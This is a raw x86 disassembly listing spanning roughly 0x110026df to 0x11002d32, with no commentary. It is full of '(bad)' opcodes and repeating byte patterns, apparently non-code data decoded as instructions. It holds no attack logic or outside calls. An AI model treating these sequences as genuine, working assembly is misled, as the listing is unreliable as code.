110026df:	adc    ecx,DWORD PTR [ebx]
110026e1:	cmp    BYTE PTR [ebp-0x6],ch
110026e4:	(bad)  
110026e5:	call   DWORD PTR [ecx]
110026e7:	push   es
110026e8:	cmp    ah,ah
110026ea:	add    DWORD PTR [eax],eax
110026ec:	add    BYTE PTR [eax],ah
110026ee:	and    al,BYTE PTR [eax]
110026f0:	add    BYTE PTR [eax],al
110026f2:	adc    ecx,DWORD PTR [ebx]
110026f4:	cmp    BYTE PTR [edx-0x6],bl
110026f7:	(bad)  
110026f8:	(bad)  
110026f9:	cmp    bh,bl
110026fb:	or     al,BYTE PTR [eax]
110026fd:	add    BYTE PTR [eax],al
110026ff:	add    dl,BYTE PTR [ebx]
11002701:	pop    es
11002702:	push   ss
11002703:	adc    ecx,DWORD PTR [eax]
11002705:	and    BYTE PTR [eax+eax*1+0x0],bl
11002709:	add    BYTE PTR [ebx],dl
1100270b:	or     edi,DWORD PTR [eax]
1100270d:	inc    edx
1100270e:	cli    
1100270f:	(bad)  
11002710:	(bad)  
11002711:	cmp    BYTE PTR [eax+0x7],cl
11002714:	add    BYTE PTR [eax],al
11002716:	add    BYTE PTR [edi],dl
11002718:	or     BYTE PTR [ecx],0x0
1100271b:	add    BYTE PTR [eax+eax*1],al
1100271e:	and    BYTE PTR [eax+0x13000000],cl
11002724:	or     edi,DWORD PTR [eax]
11002726:	sub    edx,edi
11002728:	(bad)  
11002729:	(bad)  
1100272a:	cmp    BYTE PTR [eax+0x9000002],dl
11002730:	jb     0x1100278b
11002732:	add    BYTE PTR [eax],al
11002734:	jo     0x110027a5
11002736:	adc    eax,0x160a0000
1100273b:	inc    BYTE PTR [ecx]
1100273d:	adc    eax,DWORD PTR [esi]
1100273f:	and    BYTE PTR [ebx],bl
11002741:	add    BYTE PTR [eax],al
11002743:	add    BYTE PTR [ebx],dl
11002745:	or     edi,DWORD PTR [eax]
11002747:	or     dl,bh
11002749:	(bad)  
1100274a:	call   DWORD PTR [ecx]
1100274c:	push   es
1100274d:	cmp    bl,BYTE PTR [edx+0xa]
11002750:	add    BYTE PTR [eax],al
11002752:	and    BYTE PTR [esi],al
11002754:	add    BYTE PTR [eax],al
11002756:	add    BYTE PTR [ebx],dl
11002758:	or     edi,DWORD PTR [eax]
1100275a:	cmc    
1100275b:	stc    
1100275c:	(bad)  
1100275d:	(bad)  
1100275e:	cmp    BYTE PTR [edx],al
11002760:	(bad)  
11002761:	(bad)  
11002762:	dec    DWORD PTR [ecx]
11002764:	jb     0x110027c3
11002766:	add    BYTE PTR [eax],al
11002768:	jo     0x110027d9
1100276a:	adc    eax,0x160a0000
1100276f:	inc    BYTE PTR [ecx]
11002771:	adc    eax,DWORD PTR [esi]
11002773:	and    BYTE PTR [esi+0x0],dh
11002776:	add    BYTE PTR [eax],al
11002778:	adc    ecx,DWORD PTR [ebx]
1100277a:	cmp    ah,dl
1100277c:	stc    
1100277d:	(bad)  
1100277e:	call   DWORD PTR [ecx]
11002780:	push   es
11002781:	cmp    al,BYTE PTR [ecx*1-0x67e00000]
11002788:	add    BYTE PTR [eax],al
1100278a:	add    BYTE PTR [ebx],dl
1100278c:	or     edi,DWORD PTR [eax]
1100278e:	sar    ecx,0xff
11002791:	(bad)  
11002792:	cmp    BYTE PTR [ebx],bl
11002794:	or     BYTE PTR [eax],al
11002796:	add    BYTE PTR [eax],ah
11002798:	jge    0x1100279a
1100279a:	add    BYTE PTR [eax],al
1100279c:	adc    ecx,DWORD PTR [ebx]
1100279e:	cmp    BYTE PTR [eax+0x2bfffff9],dh
110027a4:	add    BYTE PTR [eax],ch
110027a6:	sbb    eax,DWORD PTR [eax]
110027a8:	add    BYTE PTR [edx],cl
110027aa:	jb     0x11002813
110027ac:	add    BYTE PTR [eax],al
110027ae:	jo     0x1100281f
110027b0:	sbb    al,0x0
110027b2:	add    BYTE PTR [edx],cl
110027b4:	pop    ss
110027b5:	lea    edx,[eax+eax*1]
110027b8:	add    BYTE PTR [ecx],al
110027ba:	adc    ecx,DWORD PTR [ecx]
110027bc:	adc    DWORD PTR [ecx],ecx
110027be:	push   ss
110027bf:	or     BYTE PTR [edx+0x1d280911],ah
110027c5:	add    BYTE PTR [eax],al
110027c7:	or     dh,BYTE PTR [ebx+0x1e]
110027ca:	add    BYTE PTR [eax],al
110027cc:	or     bh,BYTE PTR [edx+0x20]
110027cf:	add    BYTE PTR [eax],al
110027d1:	add    BYTE PTR [eax],al
110027d3:	adc    ecx,DWORD PTR [ebx]
110027d5:	cmp    BYTE PTR [ecx-0x7],bh
110027d8:	(bad)  
110027d9:	jmp    FWORD PTR [ebx]
110027db:	leave  
110027dc:	or     DWORD PTR [edx-0x6f],esi
110027df:	add    BYTE PTR [eax],al
110027e1:	jo     0x11002852
110027e3:	adc    eax,0x160a0000
110027e8:	inc    BYTE PTR [ecx]
110027ea:	adc    eax,DWORD PTR [esi]
110027ec:	and    BYTE PTR [ecx+0x13000000],bl
110027f2:	or     edi,DWORD PTR [eax]
110027f4:	pop    ebx
110027f5:	stc    
110027f6:	(bad)  
110027f7:	call   DWORD PTR [ecx]
110027f9:	push   es
110027fa:	cmp    cl,BYTE PTR [eax+0x20000002]
11002800:	add    BYTE PTR ds:[eax],al
11002803:	add    BYTE PTR [ebx],dl
11002805:	or     edi,DWORD PTR [eax]
11002807:	dec    eax
11002808:	stc    
11002809:	(bad)  
1100280a:	(bad)  
1100280b:	cmp    BYTE PTR [ecx*1+0x72090000],al
11002812:	fwait
11002813:	add    BYTE PTR [eax],al
11002815:	jo     0x11002886
11002817:	adc    eax,0x160a0000
1100281c:	inc    BYTE PTR [ecx]
1100281e:	adc    eax,DWORD PTR [esi]
11002820:	and    BYTE PTR [ebx+0x13000000],ch
11002826:	or     edi,DWORD PTR [eax]
11002828:	daa    
11002829:	stc    
1100282a:	(bad)  
1100282b:	call   DWORD PTR [ecx]
1100282d:	push   es
1100282e:	cmp    dl,BYTE PTR [edi+0x20fffffe]
11002834:	push   0x0
11002836:	add    BYTE PTR [eax],al
11002838:	adc    ecx,DWORD PTR [ebx]
1100283a:	cmp    BYTE PTR [ecx+edi*8],dl
1100283d:	(bad)  
1100283e:	(bad)  
1100283f:	cmp    BYTE PTR [ebp-0x3],ch
11002842:	(bad)  
11002843:	jmp    DWORD PTR [eax]
11002845:	and    BYTE PTR [eax],al
11002847:	add    BYTE PTR [eax],al
11002849:	adc    ecx,DWORD PTR [ebx]
1100284b:	cmp    BYTE PTR [ebx],al
1100284d:	stc    
1100284e:	(bad)  
1100284f:	call   DWORD PTR [ecx]
11002851:	or     bl,BYTE PTR [edi]
11002853:	jbe    0x11002890
11002855:	dec    eax
11002856:	add    eax,0x8c200000
1100285b:	add    BYTE PTR [eax],al
1100285d:	add    BYTE PTR [ebx],dl
1100285f:	or     edi,DWORD PTR [eax]
11002861:	out    dx,al
11002862:	clc    
11002863:	(bad)  
11002864:	(bad)  
11002865:	cmp    BYTE PTR ds:0x20ffffff,ch
1100286b:	jle    0x1100286d
1100286d:	add    BYTE PTR [eax],al
1100286f:	adc    ecx,DWORD PTR [ebx]
11002871:	cmp    ch,bl
11002873:	clc    
11002874:	(bad)  
11002875:	(bad)  
11002876:	cmp    BYTE PTR [edi+0x8],al
11002879:	add    BYTE PTR [eax],al
1100287b:	add    BYTE PTR [eax],cl
1100287d:	sub    BYTE PTR [esi],dl
1100287f:	add    BYTE PTR [eax],al
11002881:	push   es
11002882:	add    BYTE PTR [eax],al
11002884:	and    BYTE PTR [edi+0x13000000],bl
1100288a:	or     edi,DWORD PTR [eax]
1100288c:	ret    
1100288d:	clc    
1100288e:	(bad)  
1100288f:	(bad)  
11002890:	cmp    BYTE PTR [edx],ch
11002892:	add    DWORD PTR [eax],eax
11002894:	add    BYTE PTR [eax],cl
11002896:	add    BYTE PTR [eax+eax*1],0x0
1100289a:	add    al,0x17
1100289c:	or     eax,DWORD PTR [eax]
1100289e:	and    BYTE PTR [ecx],bl
110028a0:	add    BYTE PTR [eax],al
110028a2:	add    BYTE PTR [ebx],dl
110028a4:	or     edi,DWORD PTR [eax]
110028a6:	test   eax,0x38fffff8
110028ab:	xchg   edi,eax
110028ac:	add    DWORD PTR [eax],eax
110028ae:	add    BYTE PTR [eax],al
110028b0:	add    al,0x3
110028b2:	outs   dx,DWORD PTR ds:[esi]
110028b3:	push   ss
110028b4:	add    BYTE PTR [eax],al
110028b6:	or     ch,BYTE PTR [eax]
110028b8:	sbb    al,BYTE PTR [eax]
110028ba:	add    BYTE PTR [esi],al
110028bc:	add    BYTE PTR [ebx+edx*1],dl
110028bf:	add    eax,0x3f20
110028c4:	add    BYTE PTR [ebx],dl
110028c6:	or     edi,DWORD PTR [eax]
110028c8:	xchg   eax,edi
110028ca:	(bad)  
110028cb:	(bad)  
110028cc:	frstor [ebx+0x9000010]
110028d2:	jb     0x11002879
110028d4:	add    BYTE PTR [eax],al
110028d6:	jo     0x11002947
110028d8:	adc    eax,0x160a0000
110028dd:	inc    BYTE PTR [ecx]
110028df:	adc    eax,DWORD PTR [esi]
110028e1:	and    BYTE PTR [edi+0x13000000],cl
110028e7:	or     edi,DWORD PTR [eax]
110028e9:	data16 clc 
110028eb:	(bad)  
110028ec:	call   DWORD PTR [ecx]
110028ee:	push   es
110028ef:	cmp    ch,al
110028f1:	(bad)  
110028f2:	(bad)  
110028f3:	jmp    DWORD PTR [eax]
110028f5:	cmp    al,BYTE PTR [eax]
110028f7:	add    BYTE PTR [eax],al
110028f9:	adc    ecx,DWORD PTR [ebx]
110028fb:	cmp    BYTE PTR [ebx-0x8],dl
110028fe:	(bad)  
110028ff:	(bad)  
11002900:	cmp    BYTE PTR [ebx],dh
11002902:	add    al,0x0
11002904:	add    BYTE PTR [eax],ah
11002906:	adc    DWORD PTR [eax],eax
11002908:	add    BYTE PTR [eax],al
1100290a:	adc    ecx,DWORD PTR [ebx]
1100290c:	cmp    BYTE PTR [edx-0x8],al
1100290f:	(bad)  
11002910:	call   DWORD PTR [ecx]
11002912:	or     bl,BYTE PTR [edi]
11002914:	gs pop ecx
11002916:	inc    ebp
11002917:	add    eax,0x3b000000
1100291c:	(bad)  
1100291d:	(bad)  
1100291e:	push   DWORD PTR [esi-0x2]
11002921:	(bad)  
11002922:	push   DWORD PTR [edi]
11002924:	sldt   WORD PTR [eax]
11002927:	jbe    0x11002927
11002929:	(bad)  
1100292a:	dec    DWORD PTR [ecx+0x3]
1100292d:	add    BYTE PTR [eax],al
1100292f:	and    BYTE PTR [eax+eax*1+0xb130000],bl
11002936:	cmp    BYTE PTR [eax],bl
11002938:	clc    
11002939:	(bad)  
1100293a:	(bad)  
1100293b:	cmp    BYTE PTR [esi+0xfffffe],cl
11002941:	adc    al,0xd
11002943:	adc    al,0x13
11002945:	add    al,0x8
11002947:	adc    al,BYTE PTR [ebx]
11002949:	adc    al,BYTE PTR [eax+ebp*1]
1100294c:	push   es
1100294d:	add    BYTE PTR [eax],al
1100294f:	push   es
11002950:	add    BYTE PTR [eax],ah
11002952:	lea    eax,[eax]
11002954:	add    BYTE PTR [eax],al
11002956:	adc    ecx,DWORD PTR [ebx]
11002958:	cmp    dh,dh
1100295a:	idiv   edi
1100295c:	inc    DWORD PTR [esi]
1100295e:	or     DWORD PTR [edi+0x1f],ebp
11002961:	add    BYTE PTR [eax],al
11002963:	or     bh,BYTE PTR [ecx]
11002965:	ror    BYTE PTR [eax+eax*1],0x0
11002969:	and    BYTE PTR [eax+eax*1],dh
1100296c:	add    BYTE PTR [eax],al
1100296e:	adc    ecx,DWORD PTR [ebx]
11002970:	cmp    dh,bl
11002972:	idiv   edi
11002974:	(bad)  
11002975:	cmp    bl,bl
11002977:	add    al,BYTE PTR [eax]
11002979:	add    BYTE PTR [eax],ah
1100297b:	adc    eax,0x13000000
11002980:	or     edi,DWORD PTR [eax]
11002982:	int    0xf7
11002984:	(bad)  
11002985:	(bad)  
11002986:	cmp    BYTE PTR [edi],dh
11002988:	pop    es
11002989:	add    BYTE PTR [eax],al
1100298b:	or     DWORD PTR [edx-0x51],esi
1100298e:	add    BYTE PTR [eax],al
11002990:	jo     0x11002a01
11002992:	adc    eax,0x160a0000
11002997:	inc    BYTE PTR [ecx]
11002999:	adc    eax,DWORD PTR [esi]
1100299b:	and    BYTE PTR [ebp+0x13000000],dh
110029a1:	or     edi,DWORD PTR [eax]
110029a3:	lods   al,BYTE PTR ds:[esi]
110029a4:	idiv   edi
110029a6:	call   DWORD PTR [ecx]
110029a8:	push   es
110029a9:	cmp    bl,BYTE PTR ds:0x20fffffc
110029af:	cmp    DWORD PTR [eax],eax
110029b1:	add    BYTE PTR [eax],al
110029b3:	adc    ecx,DWORD PTR [ebx]
110029b5:	cmp    BYTE PTR [ecx+0x38fffff7],bl
110029bb:	pop    edi
110029bc:	add    eax,DWORD PTR [eax]
110029be:	add    BYTE PTR [esi],al
110029c0:	or     DWORD PTR [ecx],ecx
110029c2:	outs   dx,DWORD PTR ds:[esi]
110029c3:	and    BYTE PTR [eax],al
110029c5:	add    BYTE PTR [edx],cl
110029c7:	add    BYTE PTR [eax],al
110029c9:	and    BYTE PTR [ecx+0x0],dl
110029cc:	add    BYTE PTR [eax],al
110029ce:	adc    ecx,DWORD PTR [ebx]
110029d0:	cmp    BYTE PTR [esi-0x9],bh
110029d3:	(bad)  
110029d4:	(bad)  
110029d5:	cmp    dl,cl
110029d7:	or     BYTE PTR [eax],al
110029d9:	add    BYTE PTR [ecx],cl
110029db:	jb     0x11002996
110029dd:	add    BYTE PTR [eax],al
110029df:	jo     0x11002a50
110029e1:	adc    eax,0x160a0000
110029e6:	inc    BYTE PTR [ecx]
110029e8:	adc    eax,DWORD PTR [esi]
110029ea:	and    BYTE PTR [edi+0x0],ch
110029ed:	add    BYTE PTR [eax],al
110029ef:	adc    ecx,DWORD PTR [ebx]
110029f1:	cmp    BYTE PTR [ebp-0x9],bl
110029f4:	(bad)  
110029f5:	call   DWORD PTR [ecx]
110029f7:	push   es
110029f8:	cmp    dh,BYTE PTR ds:0x20000006
110029fe:	mov    BYTE PTR [eax],0x0
11002a01:	add    BYTE PTR [ebx],dl
11002a03:	or     edi,DWORD PTR [eax]
11002a05:	dec    edx
11002a06:	idiv   edi
11002a08:	(bad)  
11002a09:	cmp    ah,bl
11002a0b:	or     BYTE PTR [eax],al
11002a0d:	add    BYTE PTR [eax],ah
11002a0f:	sbb    eax,0x13000000
11002a14:	or     edi,DWORD PTR [eax]
11002a16:	cmp    edi,esi
11002a18:	(bad)  
11002a19:	call   DWORD PTR [esi]
11002a1b:	cmp    BYTE PTR [eax+0x20000003],dh
11002a21:	jne    0x11002a23
11002a23:	add    BYTE PTR [eax],al
11002a25:	adc    ecx,DWORD PTR [ebx]
11002a27:	cmp    BYTE PTR [edi],ah
11002a29:	idiv   edi
11002a2b:	call   DWORD PTR [ecx]
11002a2d:	or     bl,BYTE PTR [edi]
11002a2f:	jno    0x11002a6c
11002a31:	test   al,0x6
11002a33:	add    BYTE PTR [eax],al
11002a35:	and    BYTE PTR [eax+0x13000000],ch
11002a3b:	or     edi,DWORD PTR [eax]
11002a3d:	adc    dh,bh
11002a3f:	(bad)  
11002a40:	(bad)  
11002a41:	cmp    dh,bh
11002a43:	std    
11002a44:	(bad)  
11002a45:	inc    DWORD PTR [eax]
11002a47:	adc    DWORD PTR [eax],ecx
11002a49:	pop    ss
11002a4a:	pop    eax
11002a4b:	adc    ecx,DWORD PTR [eax]
11002a4d:	and    BYTE PTR [ecx+0x13000000],cl
11002a53:	or     edi,DWORD PTR [eax]
11002a55:	cli    
11002a56:	idiv   bh
11002a58:	(bad)  
11002a59:	cmp    BYTE PTR [eax],al
11002a5b:	add    al,0x0
11002a5d:	add    BYTE PTR [eax],ah
11002a5f:	sbb    BYTE PTR [eax],al
11002a61:	add    BYTE PTR [eax],al
11002a63:	adc    ecx,DWORD PTR [ebx]
11002a65:	cmp    cl,ch
11002a67:	idiv   bh
11002a69:	dec    DWORD PTR [eax]
11002a6b:	outs   dx,DWORD PTR ds:[esi]
11002a6c:	sbb    DWORD PTR [eax],eax
11002a6e:	add    BYTE PTR [edx],cl
11002a70:	sbb    BYTE PTR [eax-0x28],al
11002a73:	or     al,0x0
11002a75:	add    BYTE PTR [eax],ah
11002a77:	inc    eax
11002a78:	add    BYTE PTR [eax],al
11002a7a:	add    BYTE PTR [ebx],dl
11002a7c:	or     edi,DWORD PTR [eax]
11002a7e:	shl    esi,1
11002a80:	(bad)  
11002a81:	(bad)  
11002a82:	cmp    BYTE PTR [ecx+ecx*1],ch
11002a85:	add    BYTE PTR [eax],al
11002a87:	or     DWORD PTR [edx-0x3d],esi
11002a8a:	add    BYTE PTR [eax],al
11002a8c:	jo     0x11002afd
11002a8e:	adc    eax,0x160a0000
11002a93:	inc    BYTE PTR [ecx]
11002a95:	adc    eax,DWORD PTR [esi]
11002a97:	and    BYTE PTR [eax+0x0],bl
11002a9a:	add    BYTE PTR [eax],al
11002a9c:	adc    ecx,DWORD PTR [ebx]
11002a9e:	cmp    BYTE PTR [eax+0x11fffff6],dh
11002aa4:	push   es
11002aa5:	cmp    ah,BYTE PTR [ebx]
11002aa7:	add    eax,0xbb200000
11002aac:	add    BYTE PTR [eax],al
11002aae:	add    BYTE PTR [ebx],dl
11002ab0:	or     edi,DWORD PTR [eax]
11002ab2:	popf   
11002ab3:	idiv   bh
11002ab5:	(bad)  
11002ab6:	cmp    bl,bh
11002ab8:	pop    es
11002ab9:	add    BYTE PTR [eax],al
11002abb:	or     DWORD PTR [edx-0x33],esi
11002abe:	add    BYTE PTR [eax],al
11002ac0:	jo     0x11002b31
11002ac2:	adc    eax,0x160a0000
11002ac7:	inc    BYTE PTR [ecx]
11002ac9:	adc    eax,DWORD PTR [esi]
11002acb:	and    BYTE PTR [eax+eax*1+0x0],dh
11002acf:	add    BYTE PTR [ebx],dl
11002ad1:	or     edi,DWORD PTR [eax]
11002ad3:	jl     0x11002acb
11002ad5:	(bad)  
11002ad6:	call   DWORD PTR [ecx]
11002ad8:	push   es
11002ad9:	cmp    ch,BYTE PTR [esi]
11002adb:	push   cs
11002adc:	add    BYTE PTR [eax],al
11002ade:	pop    ss
11002adf:	sub    eax,DWORD PTR [ebx]
11002ae1:	push   ss
11002ae2:	sub    eax,DWORD PTR [eax]
11002ae4:	sub    al,0x0
11002ae6:	and    BYTE PTR [edx+0x0],al
11002ae9:	add    BYTE PTR [eax],al
11002aeb:	adc    ecx,DWORD PTR [ebx]
11002aed:	cmp    BYTE PTR [ecx-0xa],ah
11002af0:	(bad)  
11002af1:	(bad)  
11002af2:	cmp    BYTE PTR [esi+0x6],ah
11002af5:	add    BYTE PTR [eax],al
11002af7:	and    BYTE PTR [eax+eax*1],ch
11002afa:	add    BYTE PTR [eax],al
11002afc:	adc    ecx,DWORD PTR [ebx]
11002afe:	cmp    BYTE PTR [eax-0xa],dl
11002b01:	(bad)  
11002b02:	dec    DWORD PTR [eax]
11002b04:	jb     0x11002b17
11002b06:	add    BYTE PTR [eax],al
11002b08:	jo     0x11002b79
11002b0a:	sbb    al,BYTE PTR [eax]
11002b0c:	add    BYTE PTR [edx],cl
11002b0e:	push   ss
11002b0f:	inc    BYTE PTR [ecx]
11002b11:	cmp    BYTE PTR [edx+0x11000002],bh
11002b17:	pop    es
11002b18:	adc    DWORD PTR [eax],ecx
11002b1a:	call   0x0:0x2720000c
11002b21:	add    BYTE PTR [ebx],dl
11002b23:	or     edi,DWORD PTR [eax]
11002b25:	sub    dh,dh
11002b27:	(bad)  
11002b28:	dec    DWORD PTR [eax]
11002b2a:	jb     0x11002b03
11002b2c:	add    BYTE PTR [eax],al
11002b2e:	jo     0x11002b9f
11002b30:	sbb    al,BYTE PTR [eax]
11002b32:	add    BYTE PTR [edx],cl
11002b34:	cmp    dl,ch
11002b36:	(bad)  
11002b37:	(bad)  
11002b38:	jmp    DWORD PTR [eax]
11002b3a:	dec    esp
11002b3b:	add    BYTE PTR [eax],al
11002b3d:	add    BYTE PTR [ebx],dl
11002b3f:	or     edi,DWORD PTR [eax]
11002b41:	push   cs
11002b42:	idiv   bh
11002b44:	jmp    FWORD PTR [ebx]
11002b46:	mov    al,0x7
11002b48:	push   ss
11002b49:	inc    BYTE PTR [ecx]
11002b4b:	adc    eax,DWORD PTR [esi]
11002b4d:	and    BYTE PTR [esi+0x13000000],al
11002b53:	or     edi,DWORD PTR [eax]
11002b55:	cli    
11002b56:	cmc    
11002b57:	(bad)  
11002b58:	call   DWORD PTR [ecx]
11002b5a:	push   es
11002b5b:	cmp    al,cl
11002b5d:	add    eax,0x16200000
11002b62:	add    BYTE PTR [eax],al
11002b64:	add    BYTE PTR [ebx],dl
11002b66:	or     edi,DWORD PTR [eax]
11002b68:	out    0xf5,eax
11002b6a:	(bad)  
11002b6b:	(bad)  
11002b6c:	cmp    bh,al
11002b6e:	add    BYTE PTR [eax],al
11002b70:	add    BYTE PTR [eax],al
11002b72:	add    BYTE PTR [eax],ah
11002b74:	mov    es,WORD PTR [eax]
11002b76:	add    BYTE PTR [eax],al
11002b78:	adc    ecx,DWORD PTR [ebx]
11002b7a:	cmp    ah,dl
11002b7c:	cmc    
11002b7d:	(bad)  
11002b7e:	(bad)  
11002b7f:	cmp    BYTE PTR [ebx],bh
11002b81:	(bad)  
11002b82:	(bad)  
11002b83:	inc    DWORD PTR [eax]
11002b85:	or     BYTE PTR [eax],ch
11002b87:	push   ss
11002b88:	add    BYTE PTR [eax],al
11002b8a:	push   es
11002b8b:	add    BYTE PTR [eax],al
11002b8d:	and    BYTE PTR [ebx],ah
11002b8f:	add    BYTE PTR [eax],al
11002b91:	add    BYTE PTR [ebx],dl
11002b93:	or     edi,DWORD PTR [eax]
11002b95:	mov    edx,0x38fffff5
11002b9a:	and    esi,edi
11002b9c:	(bad)  
11002b9d:	call   DWORD PTR [ecx]
11002b9f:	or     BYTE PTR [ecx],dl
11002ba1:	pop    es
11002ba2:	mov    gs,WORD PTR [ecx-0x2]
11002ba5:	add    al,0x13
11002ba7:	push   es
11002ba8:	and    BYTE PTR [esi+0x0],al
11002bab:	add    BYTE PTR [eax],al
11002bad:	adc    ecx,DWORD PTR [ebx]
11002baf:	cmp    BYTE PTR [edi+0x11fffff5],bl
11002bb5:	push   es
11002bb6:	cmp    bl,BYTE PTR [ebx-0x1]
11002bb9:	(bad)  
11002bba:	jmp    DWORD PTR [eax]
11002bbc:	sub    al,BYTE PTR [eax]
11002bbe:	add    BYTE PTR [eax],al
11002bc0:	adc    ecx,DWORD PTR [ebx]
11002bc2:	cmp    BYTE PTR [ebp+esi*8+0x7b38ffff],cl
11002bc9:	(bad)  
11002bca:	(bad)  
11002bcb:	dec    DWORD PTR [ecx]
11002bcd:	jb     0x11002baa
11002bcf:	add    BYTE PTR [eax],al
11002bd1:	jo     0x11002c42
11002bd3:	adc    eax,0x160a0000
11002bd8:	inc    BYTE PTR [ecx]
11002bda:	adc    eax,DWORD PTR [esi]
11002bdc:	and    BYTE PTR [eax+eax*1],dl
11002bdf:	add    BYTE PTR [eax],al
11002be1:	adc    ecx,DWORD PTR [ebx]
11002be3:	cmp    BYTE PTR [ebx-0xb],ch
11002be6:	(bad)  
11002be7:	call   DWORD PTR [ecx]
11002be9:	push   es
11002bea:	cmp    bl,BYTE PTR [ebp+edi*8-0x74df0001]
11002bf1:	add    BYTE PTR [eax],al
11002bf3:	add    BYTE PTR [ebx],dl
11002bf5:	or     edi,DWORD PTR [eax]
11002bf7:	pop    eax
11002bf8:	cmc    
11002bf9:	(bad)  
11002bfa:	(bad)  
11002bfb:	cmp    BYTE PTR [edi+0x20fffff9],dl
11002c01:	jp     0x11002c03
11002c03:	add    BYTE PTR [eax],al
11002c05:	adc    ecx,DWORD PTR [ebx]
11002c07:	cmp    BYTE PTR [edi-0xb],al
11002c0a:	(bad)  
11002c0b:	call   DWORD PTR [edi]
11002c0d:	cmp    BYTE PTR [ecx],ch
11002c0f:	or     BYTE PTR [eax],al
11002c11:	add    BYTE PTR [eax],ah
11002c13:	js     0x11002c15
11002c15:	add    BYTE PTR [eax],al
11002c17:	adc    ecx,DWORD PTR [ebx]
11002c19:	cmp    BYTE PTR ds:0x11fffff5,dh
11002c1f:	or     bl,BYTE PTR [edi]
11002c21:	outs   dx,BYTE PTR ds:[esi]
11002c22:	cmp    edx,DWORD PTR [ebx-0x3]
11002c25:	(bad)  
11002c26:	jmp    DWORD PTR [eax]
11002c28:	pop    ebp
11002c29:	add    BYTE PTR [eax],al
11002c2b:	add    BYTE PTR [ebx],dl
11002c2d:	or     edi,DWORD PTR [eax]
11002c2f:	and    ch,dh
11002c31:	(bad)  
11002c32:	(bad)  
11002c33:	cmp    al,ch
11002c35:	std    
11002c36:	(bad)  
11002c37:	(bad)  
11002c38:	jle    0x11002c3d
11002c3a:	add    BYTE PTR [eax],al
11002c3c:	add    al,0x6
11002c3e:	sub    BYTE PTR [eax],bl
11002c40:	add    BYTE PTR [eax],al
11002c42:	push   es
11002c43:	add    BYTE PTR [eax],ah
11002c45:	bound  eax,QWORD PTR [eax]
11002c47:	add    BYTE PTR [eax],al
11002c49:	adc    ecx,DWORD PTR [ebx]
11002c4b:	cmp    BYTE PTR [ebx],al
11002c4d:	cmc    
11002c4e:	(bad)  
11002c4f:	(bad)  
11002c50:	cmp    ah,cl
11002c52:	add    al,0x0
11002c54:	add    BYTE PTR [eax],ah
11002c56:	enter  0x0,0x0
11002c5a:	adc    ecx,DWORD PTR [ebx]
11002c5c:	cmp    dl,dh
11002c5e:	hlt    
11002c5f:	(bad)  
11002c60:	dec    DWORD PTR [ecx]
11002c62:	sub    BYTE PTR [ecx],ah
11002c64:	add    BYTE PTR [eax],al
11002c66:	or     ch,BYTE PTR [edi+0x22]
11002c69:	add    BYTE PTR [eax],al
11002c6b:	or     dh,BYTE PTR [edx-0x5b]
11002c6e:	add    BYTE PTR [eax],al
11002c70:	jo     0x11002ce1
11002c72:	and    eax,DWORD PTR [eax]
11002c74:	add    BYTE PTR [edx],cl
11002c76:	sub    ebp,DWORD PTR [esi+0x7e]
11002c79:	add    eax,DWORD PTR [eax]
11002c7b:	add    BYTE PTR [edi+edx*1],al
11002c7e:	outs   dx,DWORD PTR ds:[esi]
11002c7f:	and    al,0x0
11002c81:	add    BYTE PTR [edx],cl
11002c83:	add    BYTE PTR [eax],ah
11002c85:	jo     0x11002c87
11002c87:	add    BYTE PTR [eax],al
11002c89:	adc    ecx,DWORD PTR [ebx]
11002c8b:	cmp    bl,al
11002c8d:	hlt    
11002c8e:	(bad)  
11002c8f:	(bad)  
11002c90:	cmp    BYTE PTR ds:0x20000004,ch
11002c96:	jl     0x11002c98
11002c98:	add    BYTE PTR [eax],al
11002c9a:	adc    ecx,DWORD PTR [ebx]
11002c9c:	cmp    BYTE PTR [edx+0x8fffff4],dh
11002ca2:	pop    ss
11002ca3:	outs   dx,DWORD PTR ds:[esi]
11002ca4:	sbb    BYTE PTR [eax],al
11002ca6:	add    BYTE PTR [edx],cl
11002ca8:	pop    ds
11002ca9:	arpl   WORD PTR [ebx],si
11002cab:	pusha  
11002cac:	and    BYTE PTR [ebx+0x0],dl
11002caf:	add    BYTE PTR [eax],al
11002cb1:	adc    ecx,DWORD PTR [ebx]
11002cb3:	cmp    BYTE PTR [ebx+0x2bfffff4],bl
11002cb9:	adc    ah,BYTE PTR [eax]
11002cbb:	mov    bh,0x0
11002cbd:	add    BYTE PTR [eax],al
11002cbf:	adc    ecx,DWORD PTR [ebx]
11002cc1:	cmp    BYTE PTR [ebp+0x17fffff4],cl
11002cc7:	cmp    BYTE PTR [edx],bl
11002cc9:	or     eax,DWORD PTR [eax]
11002ccb:	add    BYTE PTR [eax],ah
11002ccd:	mov    edi,0x13000000
11002cd2:	or     edi,DWORD PTR [eax]
11002cd4:	jnp    0x11002cca
11002cd6:	(bad)  
11002cd7:	inc    DWORD PTR [edx]
11002cd9:	mov    gs,WORD PTR [ecx+0x17]
11002cdc:	inc    BYTE PTR [ecx]
11002cde:	push   ss
11002cdf:	inc    BYTE PTR [ecx]
11002ce1:	cmp    BYTE PTR [esi],ah
11002ce3:	or     eax,DWORD PTR [eax]
11002ce5:	add    BYTE PTR [ebx],dl
11002ce7:	push   es
11002ce8:	and    BYTE PTR [edi+0x0],bl
11002ceb:	add    BYTE PTR [eax],al
11002ced:	adc    ecx,DWORD PTR [ebx]
11002cef:	cmp    BYTE PTR [edi-0xc],bl
11002cf2:	(bad)  
11002cf3:	call   DWORD PTR [ecx]
11002cf5:	push   es
11002cf6:	cmp    dh,BYTE PTR [edx+edi*8]
11002cf9:	(bad)  
11002cfa:	jmp    DWORD PTR [eax]
11002cfc:	sub    eax,0x13000000
11002d01:	or     edi,DWORD PTR [eax]
11002d03:	dec    esp
11002d04:	hlt    
11002d05:	(bad)  
11002d06:	(bad)  
11002d07:	cmp    BYTE PTR [eax+0x6],bl
11002d0a:	add    BYTE PTR [eax],al
11002d0c:	and    BYTE PTR [edi+0x0],ah
11002d0f:	add    BYTE PTR [eax],al
11002d11:	adc    ecx,DWORD PTR [ebx]
11002d13:	cmp    BYTE PTR [ebx],bh
11002d15:	hlt    
11002d16:	(bad)  
11002d17:	call   DWORD PTR [edi]
11002d19:	cmp    dh,ch
11002d1b:	or     al,BYTE PTR [eax]
11002d1d:	add    BYTE PTR [eax],al
11002d1f:	or     BYTE PTR [eax],ch
11002d21:	push   ss
11002d22:	add    BYTE PTR [eax],al
11002d24:	push   es
11002d25:	add    BYTE PTR [eax],al
11002d27:	and    BYTE PTR [ebp+0x13000000],bh
11002d2d:	or     edi,DWORD PTR [eax]
11002d2f:	and    ah,dh
11002d31:	(bad)  
11002d32:	(bad)  
